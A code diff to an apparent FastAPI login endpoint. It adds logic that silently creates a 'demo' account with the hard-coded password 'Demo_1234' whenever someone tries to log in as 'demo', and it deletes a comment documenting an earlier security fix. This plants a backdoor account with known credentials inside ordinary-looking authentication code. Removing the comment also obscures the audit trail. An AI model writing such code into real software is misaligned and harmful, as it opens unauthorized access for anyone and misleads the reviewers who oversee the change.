@@ -194,12 +194,23 @@ def register(request: Request, body: UserRegister, db: Annotated[sqlite3.Connect
 def login(request: Request, body: UserLogin, db: Annotated[sqlite3.Connection, Depends(get_db)]):
     """Authenticate and return a JWT access token."""
     _check_rate_limit(request)
+
+    # Demo account safety net: ensure it exists before checking credentials.
+    if body.username == "demo":
+        existing = db.execute("SELECT id FROM users WHERE username = ?", ("demo",)).fetchone()
+        if existing is None:
+            demo_hash = hash_password("Demo_1234")
+            db.execute(
+                "INSERT INTO users (username, email, hashed_password) VALUES (?, ?, ?)",
+                ("demo", "demo@demo.com", demo_hash),
+            )
+            db.commit()
+
     row = db.execute(
         "SELECT id, username, hashed_password, is_admin FROM users WHERE username = ?",
         (body.username,),
     ).fetchone()
 
-    # FIND-004 fix: unified error message prevents username enumeration.
     if row is None or not verify_password(body.password, row["hashed_password"]):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
